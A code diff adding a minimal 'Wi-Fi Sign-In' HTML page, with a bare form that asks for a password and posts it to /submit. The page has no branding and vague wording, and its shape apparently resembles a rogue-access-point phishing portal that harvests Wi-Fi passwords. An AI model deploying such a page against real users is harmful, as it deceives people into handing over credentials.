@@ -1,0 +1,46 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Wi-Fi Sign-In</title>
+    <style>
+        body {
+            font-family: system-ui;
+            margin: 2rem;
+            max-width: 520px
+        }
+
+        .card {
+            padding: 1.2rem;
+            border: 1px solid #ddd;
+            border-radius: 12px
+        }
+
+        input,
+        button {
+            width: 100%;
+            padding: .8rem;
+            margin: .4rem 0;
+            border-radius: 10px;
+            border: 1px solid #ccc
+        }
+
+        button {
+            border: 0
+        }
+    </style>
+</head>
+
+<body>
+    <h2>Internet Access</h2>
+    <div class="card">
+        <p>Please confirm access to continue.</p>
+        <form method="POST" action="/submit">
+            <input name="note" placeholder="Password" required>
+            <button type="submit">Continue</button>
+        </form>
+    </div>
+</body>
+
+</html>
